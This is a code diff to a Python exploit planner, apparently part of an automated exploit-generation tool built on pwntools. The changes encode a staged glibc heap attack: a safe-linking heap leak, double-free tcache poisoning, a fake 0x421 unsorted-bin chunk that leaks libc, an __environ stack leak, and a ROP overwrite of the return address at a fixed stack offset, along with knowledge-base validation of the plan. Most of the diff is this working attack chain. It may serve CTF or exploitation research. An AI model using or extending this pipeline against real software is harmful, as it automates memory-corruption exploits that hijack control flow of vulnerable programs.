@@ -15,10 +15,15 @@ Output: final_plan.json with action sequence
 
 import json
 import os
+import sys
 import argparse
 import re
 from typing import List, Dict, Optional, Any, Set, Tuple
 from pwn import ELF, context
+
+# Add parent directory to path for knowledge base import
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
+from knowledge_base.loader import get_knowledge_base
 
 context.log_level = 'error'
 
@@ -47,6 +52,9 @@ class EvolutionaryPlanner:
         self.symbolic_results = symbolic_results or {}
         self.observed_sizes = self._extract_sizes()
         self.heap_layout = self._extract_heap_layout()
+
+        # Load knowledge base
+        self.kb = get_knowledge_base()
 
         # Load libc
         self.libc = None
@@ -269,16 +277,19 @@ class EvolutionaryPlanner:
 
     # ─── IR Generation from Action Sequence ──────────────────────────
     def _generate_ir_from_actions(self, actions: List[dict]) -> List[dict]:
-        """Convert the action sequence into concrete exploit IR."""
+        """Convert the action sequence into concrete exploit IR.
+
+        Strategy from writeup:
+        1. Leak heap via XOR safe linking
+        2. Fake 0x421 chunk → unsorted bin → leak libc (main_arena)
+        3. Fake chunk at __environ-0x18 → leak stack
+        4. Fake chunk at stack-0x158 → ROP return address
+        """
         main_size = 0x30
         if self.observed_sizes:
             main_size = self.observed_sizes[-1]
         if main_size > 0x400:
             main_size = min(main_size, 0x200)
-
-        chunk0_off = self.heap_layout.get("first_chunk_offset", 0x2a0)
-        forged_size = self._compute_forged_size()
-        poison_target = self._compute_poison_target()
 
         # Build IR stages based on detected capabilities
         ir_stages = []
@@ -290,126 +301,201 @@ class EvolutionaryPlanner:
                     if v.get("state") == "detected":
                         detected_caps.add(k)
 
-        # Stage 1: Setup and libc leak
+        # ─── Stage 1: Leak Heap (XOR Safe Linking) ───────────────────
         stage1_ir = [
-            {"op": "ALLOC", "tag": "chunk0", "size": main_size},
-            {"op": "ALLOC", "tag": "chunk1", "size": main_size},
-            {"op": "ALLOC", "tag": "chunk2", "size": main_size},
-            {"op": "ALLOC", "tag": "guard", "size": 0x20},
+            {"op": "ALLOC", "tag": "chunk0", "size": main_size, "data": "b'A'*0x30"},
+            {"op": "ALLOC", "tag": "chunk1", "size": main_size, "data": "b'B'*0x30"},
             {"op": "FREE", "tag": "chunk0"},
-            {"op": "DOUBLE_FREE_BYPASS", "tag": "chunk0"},
-            {
-                "op": "POISON_FD",
-                "tag": "chunk0",
-                "pos": f"heap_base + {hex(chunk0_off)}",
-                "target": f"heap_base + {hex(poison_target & 0xfff)}",
-            },
-            {"op": "ALLOC", "tag": "dummy", "size": main_size},
-            {
-                "op": "ALLOC",
-                "tag": "overwrite_chunk",
-                "size": main_size,
-                "data": f"p64(0)*3 + p64({hex(forged_size)})",
-            },
-            {"op": "FREE", "tag": "chunk1"},
             {
                 "op": "READ_VAL",
-                "tag": "chunk1",
-                "save_as": "libc_leak",
+                "tag": "chunk0",
+                "save_as": "xor_key",
                 "offset": 0,
+                "note": "read_first_8_bytes_fd_xor",
             },
+            {"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"},
         ]
-
-        # Compute libc base calculation
-        libc_calc_expr = "libc_leak - LIBC_AUTO_OFFSET"
-        if self.libc and self.leak_info:
-            for leak in self.leak_info:
-                if leak.get("leak_type") == "unsorted_bin" and leak.get("content"):
-                    content_int = int(leak["content"], 16)
-                    note = leak.get("note", "")
-                    m = re.search(r"libc_offset=([^,]+)", note)
-                    if m:
-                        leak_offset = int(m.group(1), 16)
-                        if self.libc:
-                            sym_offset = None
-                            for name in ["main_arena", "__malloc_hook", "__free_hook"]:
-                                if name in self.libc.symbols:
-                                    sym_offset = self.libc.symbols[name]
-                                    break
-                            if sym_offset is not None:
-                                computed = leak_offset - sym_offset - 0x60
-                                libc_calc_expr = f"libc_leak - {hex(computed)}"
-                            else:
-                                libc_calc_expr = f"libc_leak - {hex(leak_offset - 0x60)}"
-                    break
-
-        stage1_ir.append({
-            "op": "CALC",
-            "var": "libc.address",
-            "expr": libc_calc_expr,
-            "note": "AUTO",
-        })
-
         ir_stages.append({
-            "name": "setup_and_libc_leak",
-            "requires": ["double_free", "uaf"],
-            "produces": {"libc_leak": {"trust": 0.95}},
+            "name": "leak_heap_xor",
+            "requires": ["uaf"],
+            "produces": {"heap_base": {"trust": 0.95}},
             "trust": 0.95,
             "ir": stage1_ir,
         })
 
-        # Stage 2: Stack leak via __environ (if libc leak detected)
-        if "libc_leak" in detected_caps or "stack_leak" in detected_caps:
+        # ─── Stage 2: Leak libc (Fake 0x421 Unsorted Bin) ────────────
+        if "libc_leak" in detected_caps or "unsortedbin_leak" in detected_caps or "fake_unsorted_bin" in detected_caps:
             stage2_ir = [
+                # Double free bypass on chunk0
+                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                 {"op": "FREE", "tag": "chunk0"},
-                {"op": "DOUBLE_FREE_BYPASS", "tag": "chunk0"},
+                # Poison FD → heap+0x2d0 (target to overwrite chunk0 size)
                 {
                     "op": "POISON_FD",
                     "tag": "chunk0",
-                    "pos": f"heap_base + {hex(chunk0_off)}",
-                    "target": "libc.symbols['__environ'] - 0x18",
+                    "pos": "heap_base + 0x0",
+                    "target": "heap_base + 0x2d0",
                 },
-                {"op": "ALLOC", "tag": "junk", "size": main_size},
-                {"op": "ALLOC", "tag": "environ_chunk", "size": main_size},
+                # Allocate at poisoned address
+                {"op": "ALLOC", "tag": "dummy1", "size": main_size},
+                {"op": "ALLOC", "tag": "overwrite_size", "size": main_size, "data": "p64(0) + p64(0x421)"},
+
+                # Double free again → poison FD → heap+0x6f0 (fake chunk location)
+                {"op": "FREE", "tag": "chunk0"},
+                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
+                {"op": "FREE", "tag": "chunk0"},
+                {
+                    "op": "POISON_FD",
+                    "tag": "chunk0",
+                    "pos": "heap_base + 0x0",
+                    "target": "heap_base + 0x6f0",
+                },
+                {"op": "ALLOC", "tag": "dummy2", "size": main_size},
+                # Create fake chunks: prev_inuse=1, prev_size match
+                {
+                    "op": "ALLOC",
+                    "tag": "fake_chunks",
+                    "size": main_size,
+                    "data": "p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)",
+                },
+
+                # Free chunk1 → 0x421 chunk goes to unsorted bin
+                {"op": "FREE", "tag": "chunk1"},
                 {
                     "op": "READ_VAL",
-                    "tag": "environ_chunk",
-                    "save_as": "stack_leak",
-                    "offset": 0x18,
+                    "tag": "chunk1",
+                    "save_as": "libc_leak",
+                    "offset": 0,
+                    "note": "read_first_8_bytes_fd_xor",
                 },
             ]
+
+            # Compute libc base
+            libc_calc_expr = "libc_leak - LIBC_AUTO_OFFSET"
+            if self.libc:
+                sym_offset = None
+                for name in ["main_arena", "__malloc_hook", "__free_hook"]:
+                    if name in self.libc.symbols:
+                        sym_offset = self.libc.symbols[name]
+                        break
+                if sym_offset is not None:
+                    # main_arena+96 is the unsorted bin FD/BK offset
+                    libc_calc_expr = f"libc_leak - {hex(sym_offset + 96)}"
+
+            stage2_ir.append({
+                "op": "CALC",
+                "var": "libc.address",
+                "expr": libc_calc_expr,
+                "note": "AUTO",
+            })
+
             ir_stages.append({
-                "name": "target_environ_leak",
-                "requires": ["libc_leak"],
-                "produces": {"stack_leak": {"trust": 0.9}},
+                "name": "leak_libc_fake_unsorted",
+                "requires": ["heap_base", "uaf", "double_free"],
+                "produces": {"libc_leak": {"trust": 0.9}},
                 "trust": 0.9,
                 "ir": stage2_ir,
             })
 
-        # Stage 3: ROP on stack (if stack leak detected)
-        if "stack_leak" in detected_caps or "control_flow_hijack" in detected_caps:
-            stack_target_off = 0x158
+        # ─── Stage 3: Leak Stack (environ) ───────────────────────────
+        if "stack_leak" in detected_caps or "environ_leak" in detected_caps:
             stage3_ir = [
-                {"op": "FREE", "tag": "junk"},
-                {"op": "DOUBLE_FREE_BYPASS", "tag": "junk"},
+                # Double free → poison FD → __environ - 0x18
+                {"op": "FREE", "tag": "chunk0"},
+                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
+                {"op": "FREE", "tag": "chunk0"},
                 {
                     "op": "POISON_FD",
-                    "tag": "junk",
-                    "pos": f"heap_base + {hex(chunk0_off + main_size + 0x10)}",
-                    "target": f"stack_leak - {hex(stack_target_off)}",
+                    "tag": "chunk0",
+                    "pos": "heap_base + 0x0",
+                    "target": "libc.symbols['__environ'] - 0x18",
                 },
-                {"op": "ALLOC", "tag": "final_junk", "size": main_size},
-                {"op": "ALLOC_ROP", "tag": "rop_chunk", "size": main_size},
+                {"op": "ALLOC", "tag": "dummy3", "size": main_size},
+                {"op": "ALLOC", "tag": "environ_chunk", "size": main_size, "data": "b'A'*0x18"},
+                {
+                    "op": "READ_VAL",
+                    "tag": "environ_chunk",
+                    "save_as": "stack_leak",
+                    "offset": 0,
+                    "note": "skip_A_0x18_then_read_6_bytes",
+                },
             ]
             ir_stages.append({
-                "name": "modern_rop_on_stack",
-                "requires": ["stack_leak"],
-                "produces": {"control_flow_hijack": {"method": "ROP"}},
-                "trust": 0.95,
+                "name": "leak_stack_environ",
+                "requires": ["libc_leak", "uaf", "double_free"],
+                "produces": {"stack_leak": {"trust": 0.9}},
+                "trust": 0.9,
                 "ir": stage3_ir,
             })
 
+        # ─── Stage 4: ROP Return Address ─────────────────────────────
+        if "control_flow_hijack" in detected_caps or "rop_chain" in detected_caps:
+            stage4_ir = [
+                # Double free → poison FD → stack - 0x158 (return address)
+                {"op": "FREE", "tag": "chunk0"},
+                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
+                {"op": "FREE", "tag": "chunk0"},
+                {
+                    "op": "POISON_FD",
+                    "tag": "chunk0",
+                    "pos": "heap_base + 0x0",
+                    "target": "stack_leak - 0x158",
+                },
+                {"op": "ALLOC", "tag": "dummy4", "size": main_size},
+                {"op": "ALLOC_ROP", "tag": "rop_payload", "size": main_size},
+            ]
+            ir_stages.append({
+                "name": "rop_return_address",
+                "requires": ["stack_leak", "uaf", "double_free"],
+                "produces": {"control_flow_hijack": {"method": "ROP"}},
+                "trust": 0.95,
+                "ir": stage4_ir,
+            })
+
         return ir_stages
+
+    # ─── Knowledge-Based Validation ──────────────────────────────────
+
+    def validate_plan(self, plan: Dict) -> List[Dict]:
+        """Validate exploit plan against knowledge base rules."""
+        issues = []
+
+        for stage in plan.get("path", []):
+            for instr in stage.get("ir", []):
+                op = instr.get("op", "")
+                data = instr.get("data", "")
+
+                # Validate fake chunk sizes
+                if op == "ALLOC" and "0x421" in str(data):
+                    # 0x421 includes PREV_INUSE bit, actual size is 0x420
+                    actual_size = 0x420
+                    is_valid, reason = self.kb.validate_fake_chunk_size(actual_size, "unsorted_bin")
+                    if not is_valid:
+                        issues.append({
+                            "stage": stage["name"],
+                            "instruction": instr,
+                            "issue": reason,
+                            "severity": "ERROR"
+                        })
+                    else:
+                        issues.append({
+                            "stage": stage["name"],
+                            "instruction": instr,
+                            "issue": f"Knowledge validation: {reason}",
+                            "severity": "INFO"
+                        })
+
+        # Validate entire free sequence
+        free_actions = []
+        for stage in plan.get("path", []):
+            for instr in stage.get("ir", []):
+                if instr.get("op") in ("FREE", "ALLOC"):
+                    free_actions.append(instr)
+
+        is_valid, seq_issues = self.kb.validate_free_sequence(free_actions)
+        issues.extend(seq_issues)
+
+        return issues
 
     def _compute_forged_size(self) -> int:
         """Compute forged chunk size for unsorted bin attack."""
@@ -447,7 +533,20 @@ class EvolutionaryPlanner:
             print("[-] DFS failed to find complete path, falling back to detected capabilities")
             ir_stages = self._generate_ir_from_actions([])
 
-        return {"trust": 0.9, "path": ir_stages}
+        plan = {"trust": 0.9, "path": ir_stages}
+
+        # Validate plan against knowledge base
+        issues = self.validate_plan(plan)
+        if issues:
+            error_count = sum(1 for i in issues if i.get("severity") == "ERROR")
+            info_count = sum(1 for i in issues if i.get("severity") == "INFO")
+            print(f"[!] Knowledge validation: {error_count} errors, {info_count} info")
+            for issue in issues:
+                severity = issue.get("severity", "UNKNOWN")
+                print(f"    [{severity}] {issue.get('issue', '')}")
+            plan["validation_issues"] = issues
+
+        return plan
 
     def print_strategy(self, plan: Dict):
         print("\n" + "=" * 60)
